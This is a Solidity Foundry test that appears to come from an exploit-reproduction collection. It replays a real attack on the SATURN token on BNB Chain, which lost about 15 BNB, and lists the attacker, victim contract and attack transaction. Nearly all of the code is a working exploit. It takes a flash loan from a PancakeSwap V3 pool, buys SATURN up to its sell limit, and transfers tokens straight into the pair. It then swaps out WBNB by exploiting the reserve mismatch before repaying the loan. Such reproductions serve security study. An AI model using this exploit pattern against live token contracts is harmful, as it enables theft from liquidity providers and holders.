// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~15 BNB
// Attacker : 0xc468D9A3a5557BfF457586438c130E3AFbeC2ff9
// Attack Contract : 0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC
// Vulnerable Contract : 0x9BDF251435cBC6774c7796632e9C80B233055b93
// Attack Tx : https://bscscan.com/tx/0x948132f219c0a1adbffbee5d9dc63bec676dd69341a6eca23790632cb9475312
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9BDF251435cBC6774c7796632e9C80B233055b93#code

contract ContractTest is Test {
    address public attacker = address(this);
    address public SATURN_creater = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;
    address internal holderOfToken = 0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC;

    Uni_Pair_V3 pancakeV3Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IPancakePair pair_WBNB_SATURN = IPancakePair(0x49BA6c20D3e95374fc1b19D537884b5595AA6124);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 constant SATURN = IERC20(0x9BDF251435cBC6774c7796632e9C80B233055b93);
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    uint256 flashAmt = 3300 ether;
    uint256 finalSaturnSellAmt = 228_832_951_945_080_091_523_153;

    modifier balanceLog() {
        emit log_named_decimal_uint("Attacker WBNB Balance Before exploit", WBNB.balanceOf(address(this)), 18);
        _;
        emit log_named_decimal_uint("Attacker WBNB Balance After exploit", WBNB.balanceOf(address(this)), 18);
    }

    function setUp() public {
        vm.createSelectFork("bsc", 38_488_209 - 1);
        vm.label(address(SATURN), "SATURN");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(router), "PancakeSwap Router");
        vm.label(address(pair_WBNB_SATURN), "pair_WBNB_SATURN");
        vm.label(address(pancakeV3Pool), "pancakeV3Pool");
    }

    function approveAll() public {
        SATURN.approve(address(router), type(uint256).max);
        WBNB.approve(address(router), type(uint256).max);
    }

    function EnableSwitch(bool state) internal {
        vm.prank(SATURN_creater);
        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", state));
    }

    function testExploit() public balanceLog {
        approveAll();
        // init saturn token

        EnableSwitch(false);

        vm.startPrank(holderOfToken);
        SATURN.transfer(attacker, SATURN.balanceOf(holderOfToken));
        vm.stopPrank();

        EnableSwitch(true);

        // start attack
        pancakeV3Pool.flash(attacker, 0, flashAmt, bytes(""));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // Get the everyTimeSellLimitAmount from the SATURN contract
        uint256 limit = getEveryTimeSellLimitAmount();

        // Get the current balance of SATURN in the pair_WBNB_SATURN pool
        uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        // Define the swap paths
        address[] memory buyPath = getPath(address(WBNB), address(SATURN));
        address[] memory sellPath = getPath(address(SATURN), address(WBNB));

        // Calculate the amount of WBNB needed to swap for SATURN
        uint256[] memory amounts = router.getAmountsIn(amount - limit, buyPath);

        // Swap WBNB for SATURN and send the SATURN to the SATURN_creater
        swapExactTokensForTokens(amounts[0], buyPath);

        // Update the amount of SATURN in the pair_WBNB_SATURN pool
        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        // Move the block number forward by 1
        vm.roll(block.number + 1);

        // Transfer a specific amount of SATURN to the pair_WBNB_SATURN pool
        SATURN.transfer(address(pair_WBNB_SATURN), finalSaturnSellAmt);

        // Get the current reserves of SATURN and WBNB in the pair_WBNB_SATURN pool
        (uint256 SATURN_reserve, uint256 WBNB_reserve,) = pair_WBNB_SATURN.getReserves();

        // Update the amount of SATURN in the pair_WBNB_SATURN pool
        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));

        // Calculate the amount of WBNB that will be received when swapping SATURN
        amounts = router.getAmountsOut(amount - SATURN_reserve, sellPath);

        // Perform the swap in the pair_WBNB_SATURN pool and send the WBNB to the attacker
        pair_WBNB_SATURN.swap(0, amounts[1], attacker, bytes(""));

        // Transfer WBNB to the pancakeV3Pool, including the fee
        WBNB.transfer(address(pancakeV3Pool), flashAmt + fee1);
    }

    function getEveryTimeSellLimitAmount() internal returns (uint256) {
        (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
        return abi.decode(result, (uint256));
    }

    function swapExactTokensForTokens(uint256 amountIn, address[] memory path) internal {
        router.swapExactTokensForTokens(amountIn, 0, path, SATURN_creater, type(uint256).max);
    }

    function getPath(address token0, address token1) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        return path;
    }

    fallback() external payable {}
}
